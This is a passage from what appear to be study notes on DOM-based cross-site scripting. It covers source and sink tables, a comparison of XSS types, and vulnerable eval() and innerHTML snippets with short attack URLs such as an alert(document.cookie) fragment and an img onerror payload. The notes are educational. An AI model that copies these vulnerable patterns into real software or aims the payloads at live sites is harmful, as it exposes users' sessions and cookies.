â”‚                       â”‚                                      â”‚
â”‚                       â–¼                                      â”‚
â”‚     ATTACK EXECUTED!                                         â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚     â”‚ alert(1) pops up!                                      â”‚
â”‚     â”‚ Attacker could steal cookies, etc.                     â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### cookie stealing
**eval() Sink:**
```js
// SOURCE
var operation = location.hash.substring(1);

// SINK (Very dangerous!)
eval(operation);
```

**Attack:**
```
URL: site.com/calc#alert(document.cookie)

Result: Cookie stolen!
```

### DOM Sources and Sinks

#### Common SOURCES

| Source | Description | Example |
|--------|-------------|---------|
| location.hash | URL fragment after # | site.com/page#ATTACKER_INPUT |
| location.href | Full URL | site.com/page?q=ATTACKER_INPUT |
| location.search | Query string | ?name=ATTACKER_INPUT |
| document.URL | Current page URL | Full URL access |
| document.referrer | Previous page URL | Referrer header |
| window.name | Window name property | Can be set by attacker |
| postMessage | Cross-window messaging | Data from other windows |
| localStorage | Browser storage | Previously stored data |
| document.cookie | Cookies | Cookie values |

---

#### Common SINKS

| Sink | Why Dangerous | Example |
|------|---------------|---------|
| innerHTML | Executes HTML/JS | element.innerHTML = userInput |
| outerHTML | Executes HTML/JS | element.outerHTML = userInput |
| document.write | Writes to page | document.write(userInput) |
| eval() | Executes JavaScript | eval(userInput) |
| setTimeout | Executes code | setTimeout(userInput, 1000) |
| setInterval | Executes code | setInterval(userInput, 1000) |
| location.href | Redirects user | location.href = userInput |
| location.assign | Redirects user | location.assign(userInput) |
| element.src | Loads resource | script.src = userInput |

## DOM-Based Vulnerability

==A DOM-based vulnerability occurs when client-side JavaScript processes untrusted input from the browser (such as URL parameters or fragments) and updates the DOM in an unsafe way, often exploitable by sending a malicious link to a victim.==

**The vulnerability exists entirely in CLIENT-SIDE JavaScript. The server never sees the malicious payload!**

##### XSS Types Comparison

| Aspect                         | Reflected XSS | Stored XSS  | DOM-Based XSS |
| ------------------------------ | ------------- | ----------- | ------------- |
| Payload travels through server | Yes           | Yes         | No            |
| Server processes payload       | Yes           | Yes         | No            |
| Payload in HTTP response       | Yes           | Yes         | No            |
| Stored in database             | No            | Yes         | No            |
| Vulnerable code location       | Server-side   | Server-side | Client-side   |
| Execution location             | Browser       | Browser     | Browser       |
#### Types of DOM-Based Vulnerabilities
##### 1.DOM-Based XSS
Malicious script executes in browser

**Vulnerable Code:**
```js
var search = location.hash.substring(1);
document.getElementById('result').innerHTML = search;
```

**Attack URL:**
```
https://site.com/page#<img src=x onerror=alert(1)>
```
- JavaScript reads URL fragment (#)
- Writes it directly to innerHTML
- Browser parses HTML and executes script

##### 2. DOM-Based Open Redirect
##### 3. DOM-Based Cookie Manipulation
##### 4. DOM-Based JavaScript Injection
##### 5. DOM-Based Link Manipulation
